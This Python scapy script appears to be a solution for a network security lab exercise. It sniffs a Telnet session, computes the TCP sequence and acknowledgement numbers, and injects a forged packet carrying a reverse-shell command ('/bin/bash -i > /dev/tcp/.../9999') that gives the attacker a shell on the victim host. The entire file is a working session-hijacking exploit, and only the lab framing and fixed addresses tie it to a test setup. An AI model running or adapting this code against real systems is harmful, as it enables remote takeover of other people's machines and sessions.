#!/usr/bin/env python3
"""Inject the Task 4 reverse-shell command into the isolated Telnet lab flow."""

import time

from scapy.all import IP, TCP, Raw, conf, get_if_addr, send, sniff


INTERFACE = "eth0"
ATTACKER_IP = "192.168.2.100"
USER_IP = "192.168.3.100"
VICTIM_IP = "192.168.4.105"
TELNET_PORT = 23
CAPTURE_TIMEOUT_SECONDS = 60
IDLE_GAP_SECONDS = 1.5
SNIFF_TICK_SECONDS = 0.25

# This is the reverse-shell command shown in the Task 4 lab guide.
SPOOFED_PAYLOAD = (
    b"\n/bin/bash -i > /dev/tcp/192.168.2.100/9999 0<&1 2>&1\n"
)

conf.verb = 0
conf.sniff_promisc = True

CAPTURE_FILTER = (
    f"tcp and src host {VICTIM_IP} and dst host {USER_IP} "
    f"and src port {TELNET_PORT}"
)


def is_server_payload(packet):
    """Accept payload-bearing packets from the victim to the logged-in user."""
    if IP not in packet or TCP not in packet or Raw not in packet:
        return False

    tcp = packet[TCP]
    return (
        packet[IP].src == VICTIM_IP
        and packet[IP].dst == USER_IP
        and int(tcp.sport) == TELNET_PORT
        and bool(int(tcp.flags) & 0x10)
        and len(bytes(packet[Raw].load)) > 0
    )


def wait_for_idle_server_packet():
    """Keep the latest server segment and return it after the flow goes idle."""
    deadline = time.monotonic() + CAPTURE_TIMEOUT_SECONDS
    latest_packet = None
    last_packet_time = None

    while time.monotonic() < deadline:
        remaining = deadline - time.monotonic()
        packets = sniff(
            iface=INTERFACE,
            filter=CAPTURE_FILTER,
            lfilter=is_server_payload,
            timeout=min(SNIFF_TICK_SECONDS, max(0.01, remaining)),
            store=True,
            promisc=True,
        )

        for packet in packets:
            latest_packet = packet
            last_packet_time = time.monotonic()

        if (
            latest_packet is not None
            and last_packet_time is not None
            and time.monotonic() - last_packet_time >= IDLE_GAP_SECONDS
        ):
            return latest_packet

    raise TimeoutError("No suitable Telnet traffic was captured before timeout.")


def main():
    local_ip = get_if_addr(INTERFACE)
    if local_ip != ATTACKER_IP:
        raise RuntimeError(
            f"Expected {ATTACKER_IP} on {INTERFACE}, found {local_ip}. "
            "Run this script inside the Task 4 attacker container."
        )

    print(f"Listening on {INTERFACE} for mirrored Telnet traffic from {VICTIM_IP} to {USER_IP}.")
    print("In the logged-in user Telnet session, run a short command such as pwd and press Enter.")
    print(f"The script injects once after {IDLE_GAP_SECONDS:.1f} seconds without more server data.")

    packet = wait_for_idle_server_packet()
    observed_tcp = packet[TCP]
    observed_payload_length = len(bytes(packet[Raw].load))

    # The capture is victim-to-user. Reverse its TCP direction for injection:
    # next user sequence = captured ACK; next server ACK = captured SEQ + payload length.
    injected_seq = int(observed_tcp.ack)
    injected_ack = (int(observed_tcp.seq) + observed_payload_length) & 0xFFFFFFFF

    forged_packet = (
        IP(src=USER_IP, dst=VICTIM_IP, ttl=64)
        / TCP(
            sport=int(observed_tcp.dport),
            dport=int(observed_tcp.sport),
            flags="PA",
            seq=injected_seq,
            ack=injected_ack,
        )
        / Raw(load=SPOOFED_PAYLOAD)
    )

    print(
        f"Captured server segment: {VICTIM_IP}:{observed_tcp.sport} -> "
        f"{USER_IP}:{observed_tcp.dport}, payload={observed_payload_length} bytes."
    )
    print(f"Injecting one PA packet with seq={injected_seq}, ack={injected_ack}.")
    send(forged_packet, iface=INTERFACE, verbose=False)
    print("Injection sent. Check the netcat listener on attacker port 9999.")


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("Stopped by user.")
    except TimeoutError as error:
        print(str(error))
        raise SystemExit(1)
    except Exception as error:
        print(f"Error: {error}")
        raise SystemExit(1)
